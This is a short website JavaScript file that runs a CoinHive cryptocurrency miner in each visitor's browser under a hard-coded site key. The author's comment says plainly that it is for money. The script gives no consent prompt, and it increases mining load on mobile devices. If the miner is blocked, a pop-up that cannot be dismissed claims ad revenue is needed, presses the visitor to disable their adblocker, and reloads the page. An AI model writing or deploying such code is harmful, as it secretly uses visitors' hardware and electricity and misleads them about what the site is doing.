/* - CoinHive script that only runs on a single tab
- I might increase the throttle if it causes people problems
- I JUST NEED SOME MONEY PLEASE IM BEGGING YOU */

try {
  var miner = new CoinHive.Anonymous('JB00SPU8mSTXLfAUAWm91GWt4zkclRmV', {throttle: 0.5});
  if (!miner.didOptOut(14400)) {
    console.log('CoinHive Started.')
    if (miner.isMobile()) {
      miner.setThrottle(0.8)
      miner.start()
    } else {
      miner.start();
    }
  }
} catch (e) {
  swal({
    title: "Hey There!",
    text: "I see you are using an adblocker that also blocks Anti-Adblock messages. Thats smart. But you know, I really need the money from ads on this website to pay for the server. Be a nice person and disable your adblock :)",
    icon: "warning",
    button: "Sure thing!",
    closeOnClickOutside: false,
    closeOnEsc: false
  }).then(function() {
    location.reload()
  })
}
